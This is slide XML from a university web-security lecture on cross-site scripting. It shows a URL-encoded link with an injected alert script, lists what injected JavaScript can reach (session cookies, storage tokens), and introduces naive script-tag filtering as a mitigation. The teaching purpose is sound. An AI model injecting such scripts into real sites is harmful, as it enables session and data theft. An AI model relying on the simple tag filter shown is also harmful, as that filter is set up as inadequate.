                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>(it’s</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>indistinguishable</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>legit</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>JS!)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="675"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Users</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>attacked</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>simply</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>clicking</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>link</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="2795"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1060"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-25">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Click</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-665">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="15">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"https%3A%2F%2Flegit.app%3Fq%3D%3Cscript%3E</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="2795"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>alert%28%22XSS%22%29%3C%2Fscript%3E"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>here</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/a&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>It</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>everything</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>trusted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>can</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="244"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Access</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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manipulate</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-50" b="1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(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-1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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>ids!)</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Access</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-60" b="1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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>sessionStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-50" b="1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(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>tokens</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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other</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>private</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data!)</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="204"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Manipulate</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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page</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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alter</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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links,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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forms,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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add</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>content)</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Perform</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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actions</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>generate</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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click</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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events,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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submit</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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forms</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-35">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>user,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>…)</a:t>
            </a:r>
            <a:endParaRPr sz="2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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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45"/>
              <a:t>MITIGATING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-204"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t>VULNERABILITIES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962050" y="1533220"/>
            <a:ext cx="9978390" cy="3476625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="483234" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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User</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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displayed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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pages</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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should</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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treated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>very </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>carefully</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-55" b="1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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>sanitized</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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We</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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may</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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apply</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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filters</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="234"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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E.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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remove</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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occurrences</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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«</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>&lt;script&gt;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»</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>«</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>»,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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remove</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>any</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="697865">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
            </a:pP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occurrence</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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«</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>&lt;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»</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>«</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>»</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="640"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Seems</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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reasonable</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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enough?</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
